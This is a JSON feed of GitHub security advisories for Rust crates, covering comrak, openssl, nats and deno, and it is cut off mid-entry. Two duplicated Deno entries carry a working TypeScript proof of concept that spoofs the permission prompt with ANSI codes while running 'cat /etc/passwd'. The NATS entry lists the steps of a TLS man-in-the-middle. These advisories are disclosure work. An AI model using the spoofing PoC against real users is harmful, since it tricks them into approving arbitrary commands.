{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Rust crates",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/rust.json",
    "description": "Security Advisory for Rust crates on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A Comrak AST can be constructed manually by a program instead of parsing a Markdown document with <code>parse_document</code>. This AST can then be converted to HTML via <code>html::format_document_with_plugins</code>. However, the HTML formatting code assumes that the AST is well-formed. For example, many AST notes contain <code>[u8]</code> fields which the formatting code assumes is valid UTF-8 data. Several bugs can be triggered if this is not the case.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>0.17.0 contains adjustments to the AST, storing strings instead of unvalidated byte arrays.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Validate UTF-8 correctness of all data when assigning to <code>&amp;[u8]</code> and <code>Vec&lt;u8&gt;</code> fields in the AST.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<p>n/a</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kivikakk/comrak/security/advisories/GHSA-5r3x-p7xx-x6q5\">https://github.com/kivikakk/comrak/security/advisories/GHSA-5r3x-p7xx-x6q5</a></li>\n<li><a href=\"https://github.com/kivikakk/comrak/commit/9ff5f8df0ac951f5742d22a72c39b89a15f56639\">https://github.com/kivikakk/comrak/commit/9ff5f8df0ac951f5742d22a72c39b89a15f56639</a></li>\n<li><a href=\"https://github.com/kivikakk/comrak/releases/tag/0.17.0\">https://github.com/kivikakk/comrak/releases/tag/0.17.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5r3x-p7xx-x6q5\">https://github.com/advisories/GHSA-5r3x-p7xx-x6q5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5r3x-p7xx-x6q5",
            "title": "[comrak] Comrak AST node data is not validated (GHSL-2023-049)",
            "date_modified": "2023-03-28T14:45:29.000Z",
            "date_published": "2023-03-28T14:45:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5r3x-p7xx-x6q5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>comrak is vulnerable to the upstream cmark issue, <a href=\"https://github.com/commonmark/cmark/issues/354\">\"Issue revealed by fuzzer\"</a>. A large number of references in a markdown document can trigger an overly large response.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>0.17.0 contains <a href=\"https://github.com/kivikakk/comrak/commit/70f97f3ea4eae30ffbd1b94c764a3de2f1c41d2a\">https://github.com/kivikakk/comrak/commit/70f97f3ea4eae30ffbd1b94c764a3de2f1c41d2a</a>, which limits reference output to a 100Kb maximum.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>n/a</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/commonmark/cmark/issues/354\">https://github.com/commonmark/cmark/issues/354</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kivikakk/comrak/security/advisories/GHSA-xxmq-4vph-956w\">https://github.com/kivikakk/comrak/security/advisories/GHSA-xxmq-4vph-956w</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/354\">https://github.com/commonmark/cmark/issues/354</a></li>\n<li><a href=\"https://github.com/kivikakk/comrak/commit/70f97f3ea4eae30ffbd1b94c764a3de2f1c41d2a\">https://github.com/kivikakk/comrak/commit/70f97f3ea4eae30ffbd1b94c764a3de2f1c41d2a</a></li>\n<li><a href=\"https://github.com/kivikakk/comrak/releases/tag/0.17.0\">https://github.com/kivikakk/comrak/releases/tag/0.17.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xxmq-4vph-956w\">https://github.com/advisories/GHSA-xxmq-4vph-956w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xxmq-4vph-956w",
            "title": "[comrak] Comrak vulnerable to production of excessive output when parsing Markdown (GHSL-2023-048)",
            "date_modified": "2023-03-28T17:28:01.000Z",
            "date_published": "2023-03-28T14:44:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xxmq-4vph-956w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A range of quadratic parsing issues from <code>cmark</code>/<code>cmark-gfm</code> are also present in Comrak. These can be used to craft denial-of-service attacks on services that use Comrak to parse Markdown.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>0.17.0 contains fixes to known quadratic parsing issues.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>n/a</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/commonmark/cmark/issues/255\">https://github.com/commonmark/cmark/issues/255</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/389\">https://github.com/commonmark/cmark/issues/389</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/373\">https://github.com/commonmark/cmark/issues/373</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/299\">https://github.com/commonmark/cmark/issues/299</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/388\">https://github.com/commonmark/cmark/issues/388</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/284\">https://github.com/commonmark/cmark/issues/284</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/218\">https://github.com/commonmark/cmark/issues/218</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/pull/232\">https://github.com/commonmark/cmark/pull/232</a></li>\n<li><a href=\"https://github.com/github/cmark-gfm/blob/c32ef78bae851cb83b7ad52d0fbff880acdcd44a/test/pathological_tests.py#L63-L65\">https://github.com/github/cmark-gfm/blob/c32ef78bae851cb83b7ad52d0fbff880acdcd44a/test/pathological_tests.py#L63-L65</a></li>\n<li><a href=\"https://github.com/github/cmark-gfm/blob/c32ef78bae851cb83b7ad52d0fbff880acdcd44a/test/pathological_tests.py#L87-L89\">https://github.com/github/cmark-gfm/blob/c32ef78bae851cb83b7ad52d0fbff880acdcd44a/test/pathological_tests.py#L87-L89</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kivikakk/comrak/security/advisories/GHSA-8hqf-xjwp-p67v\">https://github.com/kivikakk/comrak/security/advisories/GHSA-8hqf-xjwp-p67v</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/218\">https://github.com/commonmark/cmark/issues/218</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/255\">https://github.com/commonmark/cmark/issues/255</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/284\">https://github.com/commonmark/cmark/issues/284</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/299\">https://github.com/commonmark/cmark/issues/299</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/373\">https://github.com/commonmark/cmark/issues/373</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/388\">https://github.com/commonmark/cmark/issues/388</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/issues/389\">https://github.com/commonmark/cmark/issues/389</a></li>\n<li><a href=\"https://github.com/commonmark/cmark/pull/232\">https://github.com/commonmark/cmark/pull/232</a></li>\n<li><a href=\"https://github.com/kivikakk/comrak/commit/ce795b7f471b01589f842dc09af38b025701178d\">https://github.com/kivikakk/comrak/commit/ce795b7f471b01589f842dc09af38b025701178d</a></li>\n<li><a href=\"https://github.com/github/cmark-gfm/blob/c32ef78bae851cb83b7ad52d0fbff880acdcd44a/test/pathological_tests.py#L63-L65\">https://github.com/github/cmark-gfm/blob/c32ef78bae851cb83b7ad52d0fbff880acdcd44a/test/pathological_tests.py#L63-L65</a></li>\n<li><a href=\"https://github.com/github/cmark-gfm/blob/c32ef78bae851cb83b7ad52d0fbff880acdcd44a/test/pathological_tests.py#L87-L89\">https://github.com/github/cmark-gfm/blob/c32ef78bae851cb83b7ad52d0fbff880acdcd44a/test/pathological_tests.py#L87-L89</a></li>\n<li><a href=\"https://github.com/kivikakk/comrak/releases/tag/0.17.0\">https://github.com/kivikakk/comrak/releases/tag/0.17.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8hqf-xjwp-p67v\">https://github.com/advisories/GHSA-8hqf-xjwp-p67v</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8hqf-xjwp-p67v",
            "title": "[comrak] Comrak vulnerable to quadratic runtime issues when parsing Markdown (GHSL-2023-047)",
            "date_modified": "2023-03-28T17:28:16.000Z",
            "date_published": "2023-03-28T14:40:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8hqf-xjwp-p67v"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8.1-39.0.0  are vulnerable to a security issue. More details about the vulnerabilities themselves can be found in <a href=\"https://www.openssl.org/news/secadv/20221213.txt\">https://www.openssl.org/news/secadv/20221213.txt</a> and <a href=\"https://www.openssl.org/news/secadv/20230207.txt\">https://www.openssl.org/news/secadv/20230207.txt</a>.</p>\n<p>If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pyca/cryptography/security/advisories/GHSA-x4qr-2fvf-3mr5\">https://github.com/pyca/cryptography/security/advisories/GHSA-x4qr-2fvf-3mr5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-0286\">https://nvd.nist.gov/vuln/detail/CVE-2023-0286</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0006.html\">https://rustsec.org/advisories/RUSTSEC-2023-0006.html</a></li>\n<li><a href=\"https://www.openssl.org/news/secadv/20230207.txt\">https://www.openssl.org/news/secadv/20230207.txt</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2c6c9d439b484e1ba9830d8454a34fa4f80fdfe9\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2c6c9d439b484e1ba9830d8454a34fa4f80fdfe9</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2f7530077e0ef79d98718138716bc51ca0cad658\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2f7530077e0ef79d98718138716bc51ca0cad658</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=fd2af07dc083a350c959147097003a14a5e8ac4d\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=fd2af07dc083a350c959147097003a14a5e8ac4d</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/cve-2023-0286\">https://access.redhat.com/security/cve/cve-2023-0286</a></li>\n<li><a href=\"https://ftp.openbsd.org/pub/OpenBSD/LibreSSL/libressl-3.6.2-relnotes.txt\">https://ftp.openbsd.org/pub/OpenBSD/LibreSSL/libressl-3.6.2-relnotes.txt</a></li>\n<li><a href=\"https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/018_x509.patch.sig\">https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/018_x509.patch.sig</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x4qr-2fvf-3mr5\">https://github.com/advisories/GHSA-x4qr-2fvf-3mr5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x4qr-2fvf-3mr5",
            "title": "[openssl-src] Vulnerable OpenSSL included in cryptography wheels",
            "date_modified": "2023-03-27T22:33:32.000Z",
            "date_published": "2023-02-08T22:17:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x4qr-2fvf-3mr5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8.1-39.0.0  are vulnerable to a security issue. More details about the vulnerabilities themselves can be found in <a href=\"https://www.openssl.org/news/secadv/20221213.txt\">https://www.openssl.org/news/secadv/20221213.txt</a> and <a href=\"https://www.openssl.org/news/secadv/20230207.txt\">https://www.openssl.org/news/secadv/20230207.txt</a>.</p>\n<p>If you are building cryptography source (\"sdist\") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pyca/cryptography/security/advisories/GHSA-x4qr-2fvf-3mr5\">https://github.com/pyca/cryptography/security/advisories/GHSA-x4qr-2fvf-3mr5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-0286\">https://nvd.nist.gov/vuln/detail/CVE-2023-0286</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0006.html\">https://rustsec.org/advisories/RUSTSEC-2023-0006.html</a></li>\n<li><a href=\"https://www.openssl.org/news/secadv/20230207.txt\">https://www.openssl.org/news/secadv/20230207.txt</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2c6c9d439b484e1ba9830d8454a34fa4f80fdfe9\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2c6c9d439b484e1ba9830d8454a34fa4f80fdfe9</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2f7530077e0ef79d98718138716bc51ca0cad658\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=2f7530077e0ef79d98718138716bc51ca0cad658</a></li>\n<li><a href=\"https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=fd2af07dc083a350c959147097003a14a5e8ac4d\">https://git.openssl.org/gitweb/?p=openssl.git;a=commitdiff;h=fd2af07dc083a350c959147097003a14a5e8ac4d</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/cve-2023-0286\">https://access.redhat.com/security/cve/cve-2023-0286</a></li>\n<li><a href=\"https://ftp.openbsd.org/pub/OpenBSD/LibreSSL/libressl-3.6.2-relnotes.txt\">https://ftp.openbsd.org/pub/OpenBSD/LibreSSL/libressl-3.6.2-relnotes.txt</a></li>\n<li><a href=\"https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/018_x509.patch.sig\">https://ftp.openbsd.org/pub/OpenBSD/patches/7.2/common/018_x509.patch.sig</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x4qr-2fvf-3mr5\">https://github.com/advisories/GHSA-x4qr-2fvf-3mr5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x4qr-2fvf-3mr5",
            "title": "[openssl-src] Vulnerable OpenSSL included in cryptography wheels",
            "date_modified": "2023-03-27T22:33:32.000Z",
            "date_published": "2023-02-08T22:17:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x4qr-2fvf-3mr5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The NATS official Rust clients are vulnerable to MitM when using TLS.</p>\n<p>A fix for the <code>nats</code> crate hasn't been released yet. Since the <code>nats</code> crate is going to be deprecated anyway, consider switching to <code>async-nats</code> <code>&gt;= 0.29</code> which already fixed this vulnerability.</p>\n<p>The common name of the server's TLS certificate is validated against the <code>host</code>name provided by the server's plaintext <code>INFO</code> message during the initial connection setup phase. A MitM proxy can tamper with the <code>host</code> field's value by substituting it with the common name of a valid certificate it controls, fooling the client into accepting it.</p>\n<h2 id=\"reproduction-steps\">Reproduction steps</h2>\n<ol>\n<li>The NATS Rust client tries to establish a new connection</li>\n<li>The connection is intercepted by a MitM proxy</li>\n<li>The proxy makes a separate connection to the NATS server</li>\n<li>The NATS server replies with an <code>INFO</code> message</li>\n<li>The proxy reads the <code>INFO</code>, alters the <code>host</code> JSON field and passes the tampered <code>INFO</code> back to the client</li>\n<li>The proxy upgrades the client connection to TLS, presenting a certificate issued by a certificate authority present in the client's keychain. In the previous step the <code>host</code> was set to the common name of said certificate</li>\n<li><code>rustls</code> accepts the certificate, having verified that the common name matches the attacker-controlled value it was given</li>\n<li>The client has been fooled by the MitM proxy into accepting the attacker-controlled certificate</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nats-io/nats.rs/pull/881\">https://github.com/nats-io/nats.rs/pull/881</a></li>\n<li><a href=\"https://github.com/nats-io/nats.rs/pull/887\">https://github.com/nats-io/nats.rs/pull/887</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0029.html\">https://rustsec.org/advisories/RUSTSEC-2023-0029.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wvc4-j7g5-4f79\">https://github.com/advisories/GHSA-wvc4-j7g5-4f79</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wvc4-j7g5-4f79",
            "title": "[nats] NATS TLS certificate common name validation bypass",
            "date_modified": "2023-03-27T21:12:26.000Z",
            "date_published": "2023-03-27T21:12:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wvc4-j7g5-4f79"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Arbitrary program names without any ANSI filtering allows any malicious program to clear the first 2 lines of a <code>op_spawn_child</code> or <code>op_kill</code> prompt and replace it with any desired text.</p>\n<h3 id=\"details\">Details</h3>\n<p>The main entry point comes down to the ability to override what the API control says (<a href=\"https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175\">40_process.js</a>). Because of ANSI code's ability to clear lines, a malicious program can clear the last 2 lines of the prompt and put their own header. This also works in <code>op_kill</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>This PoC works on 1.31.1, but modified versions of it work on older versions.</p>\n<p>Make a file, e.g. <code>index.ts</code>, that uses this vulnerability to spoof the <code>op_spawn_child</code> permission prompt</p>\n<pre><code class=\"language-ts\">const boldANSI = \"\\u001b[1m\" // bold\nconst unboldANSI = \"\\u001b[22m\" // unbold\n\nconst prompt = `┌ ⚠️  ${boldANSI}Deno requests run access to \"echo\"${unboldANSI}\n├ Requested by \\`Deno.Command().output()`\n\nconst moveANSIUp = \"\\u001b[1A\" // moves to the start of the line\nconst clearANSI = \"\\u001b[2K\" // clears the line\nconst moveANSIStart = \"\\u001b[1000D\" // moves to the start of the line\n\nDeno[Object.getOwnPropertySymbols(Deno)[0]].core.ops.op_spawn_child({\n    cmd: \"cat\",\n    args: [\"/etc/passwd\"],\n    clearEnv: false,\n    env: [],\n    stdin: \"null\",\n    stdout: \"inherit\",\n    stderr: \"piped\"\n}, moveANSIUp + clearANSI + moveANSIStart + prompt)\n</code></pre>\n<p>Run the file with <code>deno run index.ts</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Any Deno program is able to spoof the interactive permission prompt for the <code>op_spawn_child</code> or the <code>op_kill</code> action (which indirectly gives access to all run commands) by overriding the <code>Requested by {message} API</code> with their own ANSI codes, allowing them to clear the latter prompt and change it to whatever they needed:</p>\n<pre><code>// Expected Prompt\n┌ ⚠️  Deno requests run access to \"cat\"\n├ Requested by `Deno.Command().output()` API\n├ Run again with --allow-run to bypass this prompt.\n└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) &gt;\n\n// Actual Prompt\n┌ ⚠️  Deno requests run access to \"echo\"\n├ Requested by `Deno.Command().output()` API\n├ Run again with --allow-run to bypass this prompt.\n└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) &gt;\n</code></pre>\n<p>This works with any command on the respective platform, giving the program the full ability to choose what program they wanted to run.</p>\n<p>This problem can not be exploited on systems that do not attach an interactive prompt (for example headless servers).</p>\n<p>Before <code>v1.31.0</code>, this requires the <code>--unstable</code> flag. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf\">https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28446\">https://nvd.nist.gov/vuln/detail/CVE-2023-28446</a></li>\n<li><a href=\"https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175\">https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175</a></li>\n<li><a href=\"https://github.com/denoland/deno/releases/tag/v1.31.2\">https://github.com/denoland/deno/releases/tag/v1.31.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vq67-rp93-65qf\">https://github.com/advisories/GHSA-vq67-rp93-65qf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vq67-rp93-65qf",
            "title": "[deno] Interactive `run` permission prompt spoofing via improper ANSI neutralization",
            "date_modified": "2023-03-24T22:06:02.000Z",
            "date_published": "2023-03-24T22:06:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vq67-rp93-65qf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Arbitrary program names without any ANSI filtering allows any malicious program to clear the first 2 lines of a <code>op_spawn_child</code> or <code>op_kill</code> prompt and replace it with any desired text.</p>\n<h3 id=\"details\">Details</h3>\n<p>The main entry point comes down to the ability to override what the API control says (<a href=\"https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175\">40_process.js</a>). Because of ANSI code's ability to clear lines, a malicious program can clear the last 2 lines of the prompt and put their own header. This also works in <code>op_kill</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>This PoC works on 1.31.1, but modified versions of it work on older versions.</p>\n<p>Make a file, e.g. <code>index.ts</code>, that uses this vulnerability to spoof the <code>op_spawn_child</code> permission prompt</p>\n<pre><code class=\"language-ts\">const boldANSI = \"\\u001b[1m\" // bold\nconst unboldANSI = \"\\u001b[22m\" // unbold\n\nconst prompt = `┌ ⚠️  ${boldANSI}Deno requests run access to \"echo\"${unboldANSI}\n├ Requested by \\`Deno.Command().output()`\n\nconst moveANSIUp = \"\\u001b[1A\" // moves to the start of the line\nconst clearANSI = \"\\u001b[2K\" // clears the line\nconst moveANSIStart = \"\\u001b[1000D\" // moves to the start of the line\n\nDeno[Object.getOwnPropertySymbols(Deno)[0]].core.ops.op_spawn_child({\n    cmd: \"cat\",\n    args: [\"/etc/passwd\"],\n    clearEnv: false,\n    env: [],\n    stdin: \"null\",\n    stdout: \"inherit\",\n    stderr: \"piped\"\n}, moveANSIUp + clearANSI + moveANSIStart + prompt)\n</code></pre>\n<p>Run the file with <code>deno run index.ts</code>.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Any Deno program is able to spoof the interactive permission prompt for the <code>op_spawn_child</code> or the <code>op_kill</code> action (which indirectly gives access to all run commands) by overriding the <code>Requested by {message} API</code> with their own ANSI codes, allowing them to clear the latter prompt and change it to whatever they needed:</p>\n<pre><code>// Expected Prompt\n┌ ⚠️  Deno requests run access to \"cat\"\n├ Requested by `Deno.Command().output()` API\n├ Run again with --allow-run to bypass this prompt.\n└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) &gt;\n\n// Actual Prompt\n┌ ⚠️  Deno requests run access to \"echo\"\n├ Requested by `Deno.Command().output()` API\n├ Run again with --allow-run to bypass this prompt.\n└ Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all run permissions) &gt;\n</code></pre>\n<p>This works with any command on the respective platform, giving the program the full ability to choose what program they wanted to run.</p>\n<p>This problem can not be exploited on systems that do not attach an interactive prompt (for example headless servers).</p>\n<p>Before <code>v1.31.0</code>, this requires the <code>--unstable</code> flag. </p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf\">https://github.com/denoland/deno/security/advisories/GHSA-vq67-rp93-65qf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-28446\">https://nvd.nist.gov/vuln/detail/CVE-2023-28446</a></li>\n<li><a href=\"https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175\">https://github.com/denoland/deno/blob/7d13d65468c37022f003bb680dfbddd07ea72173/runtime/js/40_process.js#L175</a></li>\n<li><a href=\"https://github.com/denoland/deno/releases/tag/v1.31.2\">https://github.com/denoland/deno/releases/tag/v1.31.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vq67-rp93-65qf\">https://github.com/advisories/GHSA-vq67-rp93-65qf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vq67-rp93-65qf",
            "title": "[deno_runtime] Interactive `run` permission prompt spoofing via improper ANSI neutralization",
            "date_modified": "2023-03-24T22:06:02.000Z",
            "date_published": "2023-03-24T22:06:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vq67-rp93-65qf"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenSSL has a <code>modified</code> bit that it can set on on <code>X509_NAME</code> objects. If this bit is set then the object is not thread-safe even when it appears the code is not modifying the value.</p>\n<p>Thanks to David Benjamin (Google) for reporting this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sfackler/rust-openssl/pull/1854\">https://github.com/sfackler/rust-openssl/pull/1854</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0022.html\">https://rustsec.org/advisories/RUSTSEC-2023-0022.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3gxf-9r58-2ghg\">https://github.com/advisories/GHSA-3gxf-9r58-2ghg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3gxf-9r58-2ghg",
            "title": "[openssl] `openssl` `X509NameBuilder::build` returned object is not thread safe",
            "date_modified": "2023-03-24T22:01:36.000Z",
            "date_published": "2023-03-24T22:01:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3gxf-9r58-2ghg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><code>SubjectAlternativeName</code> and <code>ExtendedKeyUsage</code> arguments were parsed using the OpenSSL function <code>X509V3_EXT_nconf</code>. This function parses all input using an OpenSSL mini-language which can perform arbitrary file reads.</p>\n<p>Thanks to David Benjamin (Google) for reporting this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sfackler/rust-openssl/pull/1854\">https://github.com/sfackler/rust-openssl/pull/1854</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0023.html\">https://rustsec.org/advisories/RUSTSEC-2023-0023.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9qwg-crg9-m2vc\">https://github.com/advisories/GHSA-9qwg-crg9-m2vc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9qwg-crg9-m2vc",
            "title": "[openssl] `openssl` `SubjectAlternativeName` and `ExtendedKeyUsage::other` allow arbitrary file read",
            "date_modified": "2023-03-24T22:01:31.000Z",
            "date_published": "2023-03-24T22:01:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9qwg-crg9-m2vc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>These functions would crash when the context argument was None with certain extension types.</p>\n<p>Thanks to David Benjamin (Google) for reporting this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/sfackler/rust-openssl/pull/1854\">https://github.com/sfackler/rust-openssl/pull/1854</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2023-0024.html\">https://rustsec.org/advisories/RUSTSEC-2023-0024.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6hcf-g6gr-hhcr\">https://github.com/advisories/GHSA-6hcf-g6gr-hhcr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6hcf-g6gr-hhcr",
            "title": "[openssl] `openssl` `X509Extension::new` and `X509Extension::new_nid` null pointer dereference",
            "date_modified": "2023-03-24T22:01:24.000Z",
            "date_published": "2023-03-24T22:01:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6hcf-g6gr-hhcr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An issue was discovered in the <code>Versionize::deserialize</code> implementation provided by the <code>versionize</code> crate for <code>vmm_sys_util::fam::FamStructWrapper</code>, which can lead to out of bounds memory accesses.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The impact started with version 0.1.1. The issue was corrected in version 0.1.10 by inserting a check that verifies, for any deserialized header, the lengths of compared flexible arrays are equal and aborting deserialization otherwise.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>-</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/firecracker-microvm/versionize/pull/53\">https://github.com/firecracker-microvm/versionize/pull/53</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/firecracker-microvm/versionize/security/advisories/GHSA-8vxc-r5wp-vgvc\">https://github.com/firecracker-microvm/versionize/security/advisories/GHSA-8vxc-r5wp-vgvc</a></li>\n<li><a 